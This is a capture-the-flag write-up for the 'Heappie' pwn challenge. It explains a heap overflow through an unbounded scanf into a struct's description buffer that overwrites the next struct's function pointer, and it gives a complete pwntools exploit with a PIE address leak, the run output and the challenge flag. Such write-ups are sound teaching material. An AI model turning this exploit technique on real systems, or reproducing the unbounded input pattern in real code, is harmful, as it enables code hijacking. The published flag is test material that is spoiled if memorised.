# Heappie

### Category

Pwn

### Description

Heappie is a simple application that allows you to save and play your favorite songs. Find a way to exploit it and read the flag.

Format : **Hero{flag}**<br>
Author : **xanhacks**

### Write Up

The objective is to display the flag by calling the `win` function:

```c
void win() {
    char flag[64];
    FILE* f = fopen("flag.txt", "r");
    if (f == NULL) {
        puts("Flag file is missing!");
        exit(1);
    }

    fgets(flag, sizeof(flag), f);
    printf("Flag: %s", flag);
    fclose(f);
}
```

To do that, we will overwrite the `play` function pointer of the `Music` struct:

```c
typedef struct Music {
    void (*play)(struct Music*);

    char title[32];
    char artist[32];
    char description[128];
} Music;
```

Once the function pointer is overwritten, playing a song will call the `win` function and display the flag.

The overflow is possible due to this `scanf` call, which does not check the size of the user input:

```c
printf("Enter music description: ");
scanf("%s", music->description);
```

So we will fill the 128 bytes of the `description` buffer and then overwrite the `play` attribute of the next `Music` struct that is added. Of course, the next `Music` struct should be created without a `play` function to avoid overwriting our `win` function pointer.

> `description = b"A" * 128 + p64(elf.sym["win"])`

Here is my solve script:

```python
#!/usr/bin/env python3
from pwn import ELF, remote, p64, context


elf = context.binary = ELF('heappie/heappie', checksec=False)

PLAY_SYMBOLS = {
    b"music 1": elf.sym["play_1"],
    b"music 2": elf.sym["play_2"],
    b"music 3": elf.sym["play_3"]
}

# io = process(elf.path)
io = remote("localhost", 9000)

def add_music(title, artist, description, add_music):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'music? (y/n): ', add_music)
    io.sendlineafter(b'title: ', title)
    io.sendlineafter(b'artist: ', artist)
    io.sendlineafter(b'description: ', description)

def play_music(idx, leak_play_symbol=False):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())

    if leak_play_symbol:
        data = io.recvline()
        for key, value in PLAY_SYMBOLS.items():
            if key in data:
                return value

def delete_music(idx):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'index: ', str(idx).encode())

def show_playlist(leak_play_address=False):
    io.sendlineafter(b'>> ', b'4')

    if leak_play_address:
        io.recvuntil(b"(song: ")
        return int(io.recvline().strip()[:-1], 16)

# ----[ EXPLOIT ]-----
# context.log_level = 'debug'
add_music(b"AAAA", b"BBBB", b"CCCC", b"y")
play_addr = show_playlist(leak_play_address=True)
play_sym = play_music(0, leak_play_symbol=True)
elf.address = play_addr - play_sym

print(f"Play address: {hex(play_addr)}")
print(f"Play symbol: {hex(play_sym)}")
print(f"ELF base address: {hex(elf.address)}")
print(f"Win function address: {hex(elf.sym['win'])}")

input("Press Enter to continue...")

description = b"O" * 128 + p64(elf.sym["win"])
add_music(b"MMMM", b"NNNN", description, b"n")
add_music(b"XXXX", b"YYYY", b"ZZZZ", b"n")

play_music(2)
print(io.recvline())
io.close()
```

Execution of the script:

```bash
$ python3 xpl.py
[+] Opening connection to localhost on port 9000: Done
Play address: 0x5e22729a12b3
Play symbol: 0x12b3
ELF base address: 0x5e22729a0000
Win function address: 0x5e22729a11f9
Press Enter to continue...
b'Flag: Hero{F4K3_FL4G}\n'
[*] Closed connection to localhost port 9000
```

### Flag

Hero{b4s1c_H3AP_0verfL0w!47280319}